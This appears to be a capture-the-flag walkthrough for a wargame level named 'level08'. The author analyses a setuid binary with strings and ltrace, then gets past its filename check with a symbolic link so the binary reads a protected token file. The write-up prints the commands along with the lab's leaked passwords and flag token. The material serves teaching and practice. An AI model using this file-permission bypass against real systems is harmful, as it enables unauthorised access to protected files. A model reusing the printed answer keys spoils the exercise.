Same here, let’s `ls -l` to look for interesting files

We find an executable owned by `flag08` and a token file owned and only accesible by this same user

When we execute `level08` it asks for a file to read so we give it the token file, but it seems we don’t have permissions

Repeating the same process we use `strings` 

```jsx
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh 
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
level08.c
long long int
GNU C 4.6.3
envp
long long unsigned int
/home/user/level08
level08.c
unsigned char
short int
argc
short unsigned int
argv
main
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level08.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strstr@@GLIBC_2.0
__i686.get_pc_thunk.bx
read@@GLIBC_2.0
data_start
printf@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
err@@GLIBC_2.0
__DTOR_END__
__data_start
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
open@@GLIBC_2.0
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
write@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
_init

```

And find 2 interesting lines

```jsx
token
You may not access 'token' 
```

We can guess that there is a check against ‘token’ so let’s verify it using ltrace:

```jsx
ltrace ./level08 token
```

As we can see the program tries to open the file, read its content and prints it, but it calls strstr against `token`

To avoid this check we will create a symbolic link to the file without token in it:

```jsx
ln -s ~/token /tmp/level08

./level08 /tmp/level08
quif5eloekouj29ke0vouxean

su flag08
Password quif5eloekouj29ke0vouxean

getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

su level09
Password 25749xKZ8L7DkSCwJkT9dyv6f
```